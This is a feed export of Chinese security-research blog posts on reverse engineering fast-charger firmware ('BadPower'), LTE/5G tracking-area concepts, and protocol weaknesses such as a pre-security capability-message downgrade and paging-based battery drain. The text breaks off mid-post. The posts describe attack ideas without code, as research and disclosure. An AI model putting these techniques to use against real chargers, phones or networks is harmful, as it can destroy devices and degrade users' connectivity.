&#x903B;&#x8F91;, &#x5206;&#x6790;&#x4EEA;. &#x4E00;&#x542C;&#x5F88;&#x9AD8;&#x5927;&#x4E0A;&#x7684;&#x6837;&#x5B50;.&#x60F3;&#x7740;&#x4F1A;&#x76F8;&#x5F53;&#x590D;&#x6742;. &#x5F53;&#x65F6;&#x6B63;&#x597D;&#x5B9E;&#x9A8C;&#x5BA4;&#x7684;&#x67D0;&#x4E2A;&#x89D2;&#x843D;&#x6709;&#x4E2A;&#x53E4;&#x8001;&#x7684;&#x903B;&#x8F91;&#x5206;&#x6790;&#x4EEA;(&#x771F;&#x7684;&#x662F;&#x88AB;&#x8FD9;&#x4E2A;&#x4E1C;&#x897F;&#x7ED9;&#x5751;&#x60E8;&#x4E86;&#x2026;&#x2026; &#x5176;&#x5B9E;&#x8FD8;&#x662F;&#x81EA;&#x5DF1;&#x6CA1;&#x5F04;&#x6E05;&#x695A;&#x2026;&#x2026;) , &#x4E3A;&#x4E86;&#x5B9E;&#x9A8C;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A;&#x795E;&#x5947;&#x7684;&#x73A9;&#x610F;,&#x4E70;&#x4E86;&#x4E2A;&#x5168;&#x5957;&#x7684;&#x91D1;&#x6C99;&#x6EE9;51&#x5355;&#x7247;&#x673A;&#x5F00;&#x53D1;&#x677F;,&#x4E3B;&#x8981;&#x662F;&#x56E0;&#x4E3A;&#x4EE3;&#x7801;,&#x89C6;&#x9891;&#x4E4B;&#x7C7B;&#x7684;&#x90FD;&#x6709;. &#x7136;&#x540E;&#x70E7;&#x4E86;&#x4E2A;&#x4E32;&#x53E3;&#x901A;&#x4FE1;&#x7684;&#x7A0B;&#x5E8F;&#x8FDB;&#x53BB;,&#x7528;&#x903B;&#x8F91;&#x5206;&#x6790;&#x4EEA;&#x4E00;&#x6293;, &#x55EF;, &#x771F;&#x9999;&#x2026;&#x2026;</p><p>&#x4E0B;&#x4E00;&#x6B65;&#x5C31;&#x662F;&#x6293;&#x67D0;&#x679C;&#x5145;&#x7535;&#x5668;&#x548C;&#x67D0;&#x679C;&#x7B14;&#x8BB0;&#x672C;&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x8BAF;&#x4E86;, &#x60F3;&#x7740;&#x5148;&#x6293;&#x6293;&#x770B;&#x770B;,&#x81F3;&#x5C11;&#x5F97;&#x770B;&#x5230;&#x70B9;&#x4E1C;&#x897F;, &#x7136;&#x540E;&#x5C31;&#x8C03;&#x9608;&#x503C;&#x7535;&#x538B;, &#x53CD;&#x6B63;&#x5B83;&#x90A3;&#x4E2A;&#x5C31;&#x90A3;&#x4E48;&#x51E0;&#x4E2A;&#x9009;&#x9879;,&#x4E0D;&#x7BA1;&#x4E86;,&#x4E00;&#x4E2A;&#x4E2A;&#x8BD5;&#x4E00;&#x4E0B;, &#x7136;&#x540E;&#x5C31;&#x662F; &#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;-, &#x4E00;&#x6761;&#x7279;&#x522B;&#x5E73;&#x6ED1;&#x7684;&#x76F4;&#x7EBF;&#x2026;&#x2026;. &#x7136;&#x540E;&#x5C31;&#x6709;&#x70B9;&#x61F5;&#x4E86;&#x2026;&#x2026; &#x8FD9;&#x53EA;&#x80FD;&#x8BF4;&#x660E;&#x9608;&#x503C;&#x7535;&#x538B;&#x6709;&#x95EE;&#x9898;&#x4E86;, &#x5F00;&#x59CB;&#x7EE7;&#x7EED;&#x5543;USB PD&#x6587;&#x6863;,&#x4EE5;&#x524D;&#x90FD;&#x662F;&#x8DF3;&#x8FC7;&#x7269;&#x7406;&#x4F20;&#x8F93;&#x90A3;&#x5757;&#x770B;&#x7684;&#x2026;..</p><p>&#x55EF;, BMC, 4B5B&#x7F16;&#x7801;, &#x7136;&#x540E;&#x6BD4;&#x8F83;&#x66F2;&#x6298;&#x7684;&#x4E70;&#x4E86;&#x4E2A;LA5016, &#x8C03;&#x8282;&#x9608;&#x503C;&#x7535;&#x538B;&#x5230;0.45V, &#x53EF;&#x4EE5;&#x4E86;&#x2026; &#x4E00;&#x5F00;&#x59CB;&#x56FE;&#x7B80;&#x5355;,&#x628A;&#x6570;&#x636E;&#x5BFC;&#x51FA;&#x5230;txt,&#x7136;&#x540E;&#x5199;&#x4E86;&#x4E2A;python&#x811A;&#x672C;&#x6765;&#x89E3;&#x6790;&#x534F;&#x8BAE;,&#x770B;&#x8D77;&#x6765;&#x662F;&#x8FD9;&#x4E2A;&#x6837;&#x5B50;&#x7684;.</p><img src="/images/badpower.assets/clipboard-1600897580720.png" alt="clipboard-1600897580720" style="zoom: 33%;"><p>&#x8FD9;&#x4E2A;&#x7684;&#x540E;&#x7EED;&#x8BDD;,&#x4E3A;&#x4E86;&#x65B9;&#x4FBF; &#x5355;&#x72EC;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x89E3;&#x6790;&#x63D2;&#x4EF6;. &#x5BF9;&#x540E;&#x9762;&#x4E00;&#x4E9B;&#x5206;&#x6790;&#x5E2E;&#x52A9;&#x8FD8;&#x662F;&#x5F88;&#x5927;&#x7684;. &#x957F;&#x8FD9;&#x4E48;&#x4E2A;&#x6837;&#x5B50;&#x2026;&#x2026;</p><img src="/images/badpower.assets/image-20200924054916642-1600957928094.png" alt="image-20200924054916642" style="zoom:50%;"><p>&#x7136;&#x540E;&#x56DE;&#x5F52;&#x6B63;&#x9898;,&#x6293;&#x5230;&#x4E86;&#x4E00;&#x4E9B;&#x4EA4;&#x4E92;, &#x53D1;&#x73B0;&#x5176;&#x5B9E;&#x4E5F;&#x6CA1;&#x5565;&#x7528;&#x2026;.. &#x5C31;&#x662F;&#x83B7;&#x53D6;&#x4E2A;&#x5E8F;&#x5217;&#x53F7;,&#x7248;&#x672C;&#x4FE1;&#x606F;&#x5565;&#x7684;. &#x57FA;&#x4E8E;&#x8FD9;&#x4E2A;&#x4E5F;fuzz&#x4E86;&#x4E00;&#x4E0B;,&#x4E5F;&#x6CA1;&#x5565;&#x597D;&#x7684;&#x6548;&#x679C;. </p><p>&#x4E3B;&#x8981;&#x8FD8;&#x662F;&#x56E0;&#x4E3A;power-z&#x7684;&#x786E;&#x4E0D;&#x592A;&#x597D;&#x7528;, &#x540E;&#x9762;&#x627E;&#x7A7A;&#x57FA;&#x4E8E;stm32g0&#x5F00;&#x53D1;&#x4E86;&#x4E00;&#x6B3E;, &#x5C01;&#x88C5;&#x4E86;&#x4E00;&#x5C42;python&#x63A5;&#x53E3;,&#x7528;&#x8D77;&#x6765;&#x201D;&#x771F;&#x9999;&#x201D;.</p><p>&#x957F;&#x8FD9;&#x4E2A;&#x6837;&#x5B50;&#x2026;..</p><img src="/images/badpower.assets/image-20200924223455628.png" alt="image-20200924223455628" style="zoom: 25%;"><p>&#x7528;&#x8D77;&#x6765;&#x8FD9;&#x4E2A;&#x6837;&#x5B50;&#x2026;..</p><img src="/images/badpower.assets/clipboard-1600899274140.png" alt="clipboard-1600899274140" style="zoom: 33%;"><h2 id="&#x786C;&#x4EF6;&#x73A9;&#x6CD5;"><a href="#&#x786C;&#x4EF6;&#x73A9;&#x6CD5;" class="headerlink" title="&#x786C;&#x4EF6;&#x73A9;&#x6CD5;?"></a>&#x786C;&#x4EF6;&#x73A9;&#x6CD5;?</h2><p>&#x4E2D;&#x9014;&#x56E0;&#x4E3A;&#x4E00;&#x4E9B;&#x4E8B;&#x60C5;&#x803D;&#x8BEF;&#x4E86;,&#x540C;&#x65F6;&#x4E5F;&#x5B66;&#x4E60;&#x4E86;&#x786C;&#x4EF6;&#x76F8;&#x5173;&#x77E5;&#x8BC6;. &#x7136;&#x540E;&#x56DE;&#x8FC7;&#x5934;&#x6765;,&#x53EF;&#x4EE5;&#x62C6;&#x4E86;&#x6765;&#x5F04;&#x4E86;. &#x5176;&#x5B9E;&#x65E9;&#x4E4B;&#x524D;&#x5DF2;&#x7ECF;&#x62C6;&#x4E86;&#x4E00;&#x4E2A;,&#x5F53;&#x65F6;&#x6211;&#x53BB;&#x8BD5;&#x8BD5;&#x770B;&#x770B;&#x8FD8;&#x80FD;&#x4E0D;&#x80FD;&#x6B63;&#x5E38;&#x7528;&#x7684;&#x65F6;&#x5019;,&#x56E0;&#x4E3A;&#x7535;&#x8FD8;&#x6CA1;&#x653E;&#x5B8C;,&#x7528;&#x624B;&#x6478;&#x4E86;&#x4E00;&#x4E0B;,&#x7535;&#x5F97;&#x6211;&#x4E00;&#x6FC0;&#x7075;.&#x6709;&#x70B9;&#x614C;&#x4E86;&#x2026;&#x2026; &#x518D;&#x52A0;&#x4E0A;&#x5F53;&#x65F6;&#x5BF9;&#x786C;&#x4EF6;&#x8FD8;&#x5B8C;&#x5168;&#x4E0D;&#x4E86;&#x89E3;,&#x6240;&#x4EE5;&#x6401;&#x7F6E;&#x4E86;.</p><p>&#x5F00;&#x59CB;&#x76F4;&#x63A5;&#x62C6;&#x4E86;&#x5F04;,&#x4E3B;&#x8981;&#x662F;&#x8FD8;&#x662F;&#x56E0;&#x4E3A;&#x5728;&#x5145;&#x7535;&#x5934;&#x7F51;&#x4E0A;&#x770B;&#x5230;&#x4E86;&#x5F88;&#x591A;&#x7684;&#x62C6;&#x89E3;,&#x7136;&#x540E;&#x5BF9;&#x76F8;&#x5173;&#x82AF;&#x7247;&#x4E5F;&#x4E86;&#x89E3;&#x4E86;&#x5F88;&#x591A;,&#x52A0;&#x4E0A;&#x5728;&#x4E00;&#x4E9B;&#x5F00;&#x53D1;&#x8005;&#x8BBA;&#x575B;&#x4E00;&#x76F4;&#x6DF7;&#x7740;,&#x611F;&#x89C9;&#x4E5F;&#x6BD4;&#x8F83;&#x6709;&#x5E95;&#x4E86;.</p><p>&#x7136;&#x540E;&#x662F;&#x4E00;&#x5957;&#x786C;&#x4EF6;&#x76F8;&#x5173;&#x641E;&#x6CD5;,&#x5176;&#x5B9E;&#x4E5F;&#x662F;&#x6BD4;&#x8F83;&#x5E38;&#x89C4;&#x7684;&#x65B9;&#x6CD5;,&#x53EA;&#x662F;&#x6709;&#x4E00;&#x4E9B;&#x5751;. &#x6700;&#x540E;&#x4E5F;&#x5F04;&#x51FA;&#x6765;&#x4E86;&#x56FA;&#x4EF6;. &#x9006;&#x5411;&#x5206;&#x6790;,&#x66F4;&#x65B0;&#x534F;&#x8BAE;,&#x6F0F;&#x6D1E;,&#x56FA;&#x4EF6;&#x4FEE;&#x6539;&#x7B49;&#x7B49;&#x8FD9;&#x4E00;&#x5957;&#x4E86;.</p><h2 id="&#x540E;&#x7EED;"><a href="#&#x540E;&#x7EED;" class="headerlink" title="&#x540E;&#x7EED;"></a>&#x540E;&#x7EED;</h2><p>&#x80FD;&#x63A7;&#x5236;&#x4E86;,&#x80FD;&#x5E72;&#x4EC0;&#x4E48;? &#x8FD9;&#x662F;&#x4E2A;&#x8111;&#x6D1E;&#x5927;&#x5F00;&#x7684;&#x8FC7;&#x7A0B;&#x2026;&#x2026; &#x5404;&#x79CD;&#x5C1D;&#x8BD5;&#x5427;,&#x867D;&#x7136;&#x6700;&#x540E;&#x662F;&#x4EE5;&#x201D;BadPower&#x201D;&#x7684;&#x65B9;&#x5F0F;&#x5448;&#x73B0;. &#x4F46;&#x4E2D;&#x95F4;&#x8FD8;&#x662F;&#x6709;&#x5F88;&#x591A;&#x5C0F;&#x63D2;&#x66F2;.</p><p>&#x4E00;&#x5F00;&#x59CB;&#x6211;&#x6D4B;&#x8BD5;&#x7684;&#x65F6;&#x5019;, &#x5F53;&#x65F6;&#x8FD8;&#x6CA1;&#x60F3;&#x592A;&#x591A;, &#x53EA;&#x662F;&#x60F3;&#x9A8C;&#x8BC1;&#x4E00;&#x4E0B;&#x6211;&#x4FEE;&#x6539;&#x7684;&#x6709;&#x6CA1;&#x6709;&#x6548;&#x679C;, &#x800C;&#x5F53;&#x65F6;&#x5468;&#x56F4;&#x4E5F;&#x6CA1;&#x5565;&#x4E1C;&#x897F;,&#x7136;&#x540E;&#x5C31;&#x5F88;&#x60B2;&#x5267;&#x4E86;,&#x628A;&#x521A;&#x7ED9;&#x53D1;&#x4E86;&#x4E00;&#x4E2A;&#x667A;&#x80FD;&#x97F3;&#x7BB1;&#x7ED9;&#x70E7;&#x4E86;&#x2026;&#x2026;</p><p>&#x7136;&#x540E;&#x5C31;&#x662F;&#x2026;&#x2026; </p><p>&#x628A;MacBook&#x7684;&#x4E3B;&#x677F;&#x70E7;&#x4E86;&#x2026;&#x2026;</p><p>&#x628A;pixel&#x624B;&#x673A;&#x5145;&#x7535;&#x7535;&#x8DEF;&#x7ED9;&#x5F04;&#x574F;&#x4E86;,&#x5145;&#x4E0D;&#x4E86;&#x7535;&#x4E86;&#x2026;&#x2026;</p><p>&#x2026;&#x2026;</p><p>&#x201C;&#x90A3;&#x4E9B;&#x8BBE;&#x5907;&#x6CA1;&#x6709;&#x610F;&#x8BC6;&#x5230;&#x7684;&#x662F;&#x2026; &#x5371;&#x9669;&#x6B63;&#x5728;&#x4E00;&#x6B65; &#x4E00;&#x6B65;&#x5730;&#x5411;&#x5B83;&#x9760;&#x8FD1;&#x2026;&#x2026;&#x201D;</p></body></html>]]></content>
      
      
      <categories>
          
          <category> iots </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iots </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5G安全-概念之TA/TAI</title>
      <link href="/2020/09/24/ta-tai/"/>
      <url>/2020/09/24/ta-tai/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>TA&#xFF1A;Tracking Area;</p><p>&#x8FD9;&#x5757;&#x7684;&#x6982;&#x5FF5;&#x4E3B;&#x8981;&#x662F;&#x6DF7;&#x5728;cell&#x91CC;&#x9762;,&#x5BB9;&#x6613;&#x4E71;. TA/TAI&#x8FD9;&#x5757;&#x4EE5;&#x53CA;&#x76F8;&#x5173;&#x5185;&#x5BB9;&#x5728;LTE&#x73AF;&#x5883;&#x4E0B;&#x4F2A;&#x57FA;&#x7AD9;,&#x964D;&#x7EA7;&#x653B;&#x51FB;&#x8FD9;&#x5757;&#x4F7F;&#x7528;&#x662F;&#x76F8;&#x5F53;&#x5E7F;&#x6CDB;&#x7684;.&#x8054;&#x7CFB;&#x4E0A;tracking area update request, reject.</p><p>TA&#x53EA;&#x8981;&#x7528;&#x9014;&#x662F;&#x65B9;&#x9762;&#x6838;&#x5FC3;&#x7F51;MME&#x5BF9;&#x7528;&#x6237;&#x7684;&#x8FFD;&#x8E2A;,&#x56E0;&#x4E3A;&#x4E00;&#x822C;UE&#x4E0D;&#x4F1A;&#x4E00;&#x76F4;&#x4FDD;&#x6301;connect&#x7684;&#x72B6;&#x6001;,&#x6B64;&#x65F6;&#x8981;&#x662F;&#x6765;&#x4E86;&#x4E00;&#x4E2A;&#x7535;&#x8BDD;&#x6216;&#x8005;&#x5176;&#x4ED6;&#x4FE1;&#x606F;&#x7684;&#x65F6;&#x5019;,MME&#x4F1A;&#x5C06;&#x4F9D;&#x636E;TA&#x5411;&#x8BE5;UE&#x8FDB;&#x884C;Paging&#xFF0E;</p><p>&#x4E00;&#x5F00;&#x59CB;&#x6CE8;&#x518C;&#x5165;&#x7F51;&#x7684;&#x65F6;&#x5019;&#xFF0C;UE&#x53D1;&#x8D77;Attach Request,&#x800C;&#x540E;MME&#x4F1A;&#x56DE;&#x5E94;Attach accept,&#x4F1A;&#x7ED9;UE&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x521D;&#x59CB;&#x7684;TAI List(&#x5927;&#x5C0F;&#x5728;1~16),&#x8981;&#x662F;&#x5728;&#x8FD9;&#x4E2A;&#x533A;&#x57DF;&#x5185;&#x6D3B;&#x52A8;,&#x662F;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;TAU(tracking area update). &#x5148;&#x6293;&#x7684;&#x65B0;&#x9C9C;&#x51FA;&#x7089;&#x7684;attach accept, TAI LIST&#x5927;&#x5C0F;&#x662F;1</p><img src="/images/ta-tai.assets/image-20200923155910087.png" alt="image-20200923155910087" style="zoom:80%;"><p>&#x5173;&#x4E8E;TAI(Identity), TAC(code), Cell. </p><p>tai&#x5C31;&#x662F;ta&#x7684;&#x4E00;&#x4E2A;&#x6807;&#x8BC6;, &#x5B83;&#x5728;tac&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x52A0;&#x4E86;&#x8FD0;&#x8425;&#x5546;&#x76F8;&#x5173;&#x4FE1;&#x606F;,&#x4E5F;&#x5C31;&#x662F;mcc&#x548C;mnc,&#x5728;&#x6293;&#x7684;&#x5305;&#x4E2D;&#x5F88;&#x5BB9;&#x6613;&#x770B;&#x51FA;&#x6765;.</p><p>&#x7136;&#x540E;&#x5C31;&#x662F;Cell, tracking area&#x7684;area&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x662F;&#x533A;&#x57DF;, &#x6240;&#x4EE5;&#x5173;&#x7CFB;&#x662F;&#x4E00;&#x4E2A;TA&#x53EF;&#x4EE5;&#x7531;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;Cell&#x7EC4;&#x6210;,&#x800C;&#x4E00;&#x4E2A;cell&#x53EA;&#x80FD;&#x5C5E;&#x4E8E;&#x4E00;&#x4E2A;TA.</p><p>&#x76F8;&#x5173;&#x6982;&#x5FF5;&#x53EF;&#x4EE5;&#x53C2;&#x8003;:<a href="https://wenku.baidu.com/view/4def34a9561252d380eb6ecf.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/4def34a9561252d380eb6ecf.html</a></p><h2 id="&#x540E;&#x7EED;"><a href="#&#x540E;&#x7EED;" class="headerlink" title="&#x540E;&#x7EED;"></a>&#x540E;&#x7EED;</h2><p>&#x5728;&#x8FD9;&#x4E9B;&#x6982;&#x5FF5;&#x6E05;&#x6670;&#x4E86;&#x4E4B;&#x540E;,&#x540E;&#x9762;&#x8981;&#x662F;&#x76F8;&#x5173;&#x7684;cell reselection &#x89E6;&#x53D1; tau request, &#x7136;&#x540E; tau reject&#x7684;&#x8BDD;&#x5C31;&#x4F1A;&#x6E05;&#x6670;&#x5F88;&#x591A;&#x4E86;.</p></body></html>]]></content>
      
      
      <categories>
          
          <category> 5G </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5gallinone</title>
      <link href="/2020/09/24/5gallinone/"/>
      <url>/2020/09/24/5gallinone/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x505A;&#x4E86;&#x5927;&#x534A;&#x5E74;&#x7684;LTE/5G&#x76F8;&#x5173;&#xFF0C;&#x7B97;&#x662F;&#x57FA;&#x672C;&#x5165;&#x95E8;&#x4E86;&#x3002;&#x56E0;&#x4E3A;&#x6982;&#x5FF5;&#x3001;&#x5185;&#x5BB9;&#x6BD4;&#x8F83;&#x591A;&#xFF0C;&#x6574;&#x4E2A;&#x7ECF;&#x5386;&#x6BD4;&#x8F83;&#x75DB;&#x82E6;&#x3002;&#x4E00;&#x5F00;&#x59CB;&#x5543;&#x6587;&#x6863;&#xFF0C;&#x5B9E;&#x5728;&#x770B;&#x4E0D;&#x61C2;+&#x770B;&#x4E0D;&#x4E0B;&#x53BB;&#x3002;&#x8F6C;&#x800C;&#x770B;&#x8BBA;&#x6587;&#xFF0C;&#x8212;&#x670D;&#x4E86;&#x5F88;&#x591A;&#xFF0C;&#x518D;&#x8F6C;&#x5411;&#x6587;&#x6863;&#x4E5F;&#x6E05;&#x6670;&#x4E86;&#x5F88;&#x591A;&#x3002;&#x540E;&#x7EED;&#x53EF;&#x4EE5;&#x6363;&#x9F13;sdr&#xFF0C;&#x5728;&#x770B;&#x5B8C;&#x6587;&#x6863;&#x540E;&#x8C03;sdr&#x7B80;&#x76F4;&#x592A;&#x8212;&#x670D;&#x4E86;&#xFF0C;&#x5C3D;&#x7BA1;oai&#x7684;&#x4EE3;&#x7801;&#x98CE;&#x683C;&#xFF0C;&#x4E00;&#x8A00;&#x96BE;&#x5C3D;&#x3002;&#x3002;&#x3002;</p><p><strong>&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x6BD4;&#x8F83;&#x5E38;&#x89C4;&#xFF1A;</strong></p><p>&#x7F51;&#x7EDC;&#x6574;&#x4F53;&#x67B6;&#x6784;+&#x63A7;&#x5236;&#x9762;&#x6D88;&#x606F;+&#x5386;&#x53F2;&#x7814;&#x7A76;+&#x534F;&#x8BAE;&#x6807;&#x51C6;&#x6361;&#x6F0F;+sdr&#x5B9E;&#x9A8C;&#x9A8C;&#x8BC1;&#x3002;</p><p>&#x5C06;&#x4EE5;&#x524D;&#x7684;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#x7528;&#x7A7A;&#x4F59;&#x65F6;&#x95F4;&#x7ED9;&#x6574;&#x7406;&#x4E86;&#x4E00;&#x4E0B;&#x3002;&#x6162;&#x6162;&#x6574;&#x7406;&#x3002;</p><h2 id="&#x76EE;&#x5F55;"><a href="#&#x76EE;&#x5F55;" class="headerlink" title="&#x76EE;&#x5F55;"></a>&#x76EE;&#x5F55;</h2><ul><li>5G&#x5B89;&#x5168;-&#x6982;&#x5FF5;&#x4E4B;TATAI</li><li>5G&#x5B89;&#x5168;-&#x53D1;&#x73B0;&#x7684;&#x51E0;&#x4E2A;&#x5C0F;&#x95EE;&#x9898;</li><li>5G&#x5B89;&#x5168;-RRCConnectionRelease Redirected&#x5206;&#x6790;</li></ul></body></html>]]></content>
      
      
      <categories>
          
          <category> 5G </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5G安全-发现的几个小问题</title>
      <link href="/2020/09/23/small-problems/"/>
      <url>/2020/09/23/small-problems/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x5728;&#x770B;&#x534F;&#x8BAE;&#x7684;&#x65F6;&#x5019;&#x53D1;&#x73B0;&#x4E86;&#x51E0;&#x4E2A;&#x5C0F;&#x95EE;&#x9898;,&#x5176;&#x5B9E;&#x5F53;&#x65F6;&#x4E5F;&#x6CA1;&#x89C9;&#x5F97;&#x662F;&#x4EC0;&#x4E48;&#x95EE;&#x9898;,&#x6709;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#x5728;1&#x6708;&#x4EFD;&#x7684;&#x5DE6;&#x53F3;&#x53D1;&#x73B0;,&#x4E5F;&#x6CA1;&#x548B;&#x5173;&#x6CE8;&#x4E86;,&#x5230;&#x4E86;6,7&#x6708;&#x6574;&#x7406;&#x5185;&#x5BB9;&#x7684;&#x65F6;&#x5019;&#x60F3;&#x7740;&#x6574;&#x7406;&#x4E00;&#x4E0B;&#x4FE1;&#x606F;&#x7ED9;3GPP&#x62A5;&#x4E00;&#x4E0B;,&#x53D1;&#x73B0;&#x7ED9;&#x6700;&#x65B0;&#x7684;&#x6587;&#x6863;&#x7ADF;&#x7136;&#x7ED9;&#x4FEE;&#x4E86;. &#x611F;&#x89C9;&#x633A;&#x8BE7;&#x5F02;&#x7684;&#x2026;&#x2026;&#x5206;&#x4EAB;&#x4E00;&#x4E0B;,&#x5371;&#x5BB3;&#x4E0D;&#x5927;,&#x653B;&#x51FB;&#x6210;&#x672C;&#x592A;&#x9AD8;.</p><h2 id="EN-DC-UE-Capbility-Information&#x95EE;&#x9898;"><a href="#EN-DC-UE-Capbility-Information&#x95EE;&#x9898;" class="headerlink" title="EN-DC UE Capbility Information&#x95EE;&#x9898;"></a>EN-DC UE Capbility Information&#x95EE;&#x9898;</h2><p>&#x8FD9;&#x4E2A;&#x662F;&#x5728;&#x770B;EN-DC&#xFF0C;&#x975E;&#x72EC;&#x7ACB;&#x7EC4;&#x7F51;&#x7684;&#x6CE8;&#x518C;&#x6D41;&#x7A0B;&#x53D1;&#x73B0;&#xFF0E;&#x8BE6;&#x7EC6;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#xFF1A;</p><p><a href="https://www.eventhelix.com/5G/non-standalone-access-en-dc/en-dc-secondary-node-addition.pdf" target="_blank" rel="noopener">https://www.eventhelix.com/5G/non-standalone-access-en-dc/en-dc-secondary-node-addition.pdf</a></p><p>&#x5176;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x6D41;&#x7A0B;&#x662F;&#x57FA;&#x7AD9;&#x7ED9;UE&#x53D1;&#x9001;UE Capability Enquiry&#x6765;&#x67E5;&#x8BE2;UE&#x6240;&#x80FD;&#x652F;&#x6301;&#x7684;&#x7F51;&#x7EDC;&#x7C7B;&#x578B;&#x80FD;&#x529B;,&#x5728;TS 36331&#x4E2D;&#x6709;&#x63CF;&#x8FF0;:</p><img src="/images/small-problems.assets/image-20200924222031320.png" alt="image-20200924222031320" style="zoom:80%;"><p>UE&#x6536;&#x5230;&#x540E;&#x4F1A;&#x628A;&#x81EA;&#x5DF1;&#x652F;&#x6301;&#x7684;&#x7F51;&#x7EDC;&#x80FD;&#x529B;&#x53D1;&#x7ED9;&#x57FA;&#x7AD9;,&#x4E3A;&#x4E86;&#x540E;&#x9762;&#x6B63;&#x5E38;&#x4E0A;&#x7F51;&#x6D41;&#x7A0B;.</p><p>&#x56E0;&#x4E3A;&#x8BE5;&#x8FC7;&#x7A0B;&#x662F;&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;, &#x6BD4;&#x5982;&#x6211;&#x4EEC;&#x80FD;&#x591F;&#x4E2D;&#x95F4;&#x4EBA;&#x4FEE;&#x6539;UECapabilityInformation&#x8BA9;&#x57FA;&#x7AD9;&#x8BA4;&#x4E3A;UE&#x53EA;&#x652F;&#x6301;GSM&#x7684;&#x8BDD;,&#x90A3;&#x4E48;UE&#x5C31;&#x6CA1;&#x6CD5;&#x6B63;&#x5E38;&#x7528;LTE/5G,&#x90A3;&#x4E48;&#x5C31;&#x80FD;&#x591F;&#x5B9E;&#x73B0;&#x964D;&#x7EA7;.</p><p>&#x6211;&#x5728;&#x770B;&#x6D41;&#x7A0B;&#x7684;&#x65F6;&#x5019;,&#x53D1;&#x73B0;&#x8BE5;&#x8FC7;&#x7A0B;&#x7ADF;&#x7136;&#x5728;AS Security&#x4E4B;&#x524D;. &#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x53EA;&#x8981;&#x4E2D;&#x95F4;&#x4EBA;,&#x5C31;&#x53EF;&#x4EE5;&#x968F;&#x4FBF;&#x4FEE;&#x6539;&#x4E86;.</p><p>&#x4F46;&#x5176;&#x5B9E;&#x534F;&#x8BAE;&#x6587;&#x6863;&#x4E2D;&#x5176;&#x5B9E;&#x4E5F;&#x6CA1;&#x5F88;&#x660E;&#x786E;&#x6307;&#x51FA;&#x6765;, TS 36331 f80, 5.6.3&#x4E2D;&#x7684;&#x63CF;&#x8FF0;&#x4E2D;,&#x5176;&#x5B9E;&#x5C31;&#x6CA1;&#x6709;&#x8003;&#x8651;UECapabilityInformation&#x7684;&#x53D1;&#x9001;&#x524D;&#x63D0;&#x9650;&#x5236;&#xFF0E;&#x76F8;&#x5F53;&#x7B80;&#x5355;&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#xFF1A;</p><p><img src="/images/small-problems.assets/image-20200923153129941.png" alt="image-20200923153129941"></p><p>&#x6211;&#x4E00;&#x76F4;&#x7531;&#x6700;&#x65B0;&#x5F80;&#x524D;&#x627E;&#xFF0C;&#x53D1;&#x73B0;&#x5C31;&#x662F;&#x5728;TS 36331 f90 (2020/3/31)&#x4E2D;&#x6DFB;&#x52A0;&#x4E86;&#x76F8;&#x5173;&#x4FEE;&#x590D;&#x2026;&#x2026;</p><p><img src="/images/small-problems.assets/image-20200923153345269.png" alt="image-20200923153345269"></p><p>&#x660E;&#x786E;&#x5F3A;&#x8C03;&#x4E86;&#x5FC5;&#x987B;&#x5728;AS Security&#x4E4B;&#x540E;&#x624D;&#x8BA4;UE&#x53D1;&#x9001;&#x8FC7;&#x6765;&#x7684;UECapabilityInformation. </p><h2 id="paging&#x8017;&#x7535;"><a href="#paging&#x8017;&#x7535;" class="headerlink" title="paging&#x8017;&#x7535;"></a>paging&#x8017;&#x7535;</h2><p>&#x5176;&#x5B9E;&#x7B97;&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x6C34;&#x7684;&#x95EE;&#x9898;,&#x5176;&#x5B9E;&#x6211;&#x4EEC;&#x642D;&#x5EFA;&#x4E00;&#x5957;&#x4F2A;&#x57FA;&#x7AD9;&#x7684;&#x73AF;&#x5883;,&#x5C31;&#x80FD;&#x591F;&#x53D1;&#x9001;Paging. &#x4E3B;&#x8981;&#x662F;&#x628A;&#x76EE;&#x6807;&#x653E;&#x5728;5G&#x573A;&#x666F;&#x4E0B;&#x7684;IoT&#x8BBE;&#x5907;&#x4E0A;&#x5C31;&#x6709;&#x70B9;&#x610F;&#x601D;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x4E3A;&#x4E86;&#x8282;&#x7701;&#x7528;&#x7535;&#xFF0C;&#x4E00;&#x4E9B;IoT&#x8BBE;&#x5907;&#x90FD;&#x662F;IDLE&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x8981;&#x662F;&#x80FD;&#x591F;paging&#x5524;&#x9192;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x80FD;&#x591F;&#x6D88;&#x8017;&#x7535;&#x91CF;&#xFF0E;</p><p>&#x4F46;&#x5176;&#x5B9E;&#x50CF;&#x4E00;&#x4E9B;&#x573A;&#x666F;&#x4E0B;&#xFF0C;&#x90A3;&#x4E9B;IoT&#x8BBE;&#x5907;&#x4E5F;&#x5C31;&#x5B9A;&#x671F;&#x68C0;&#x67E5;&#x4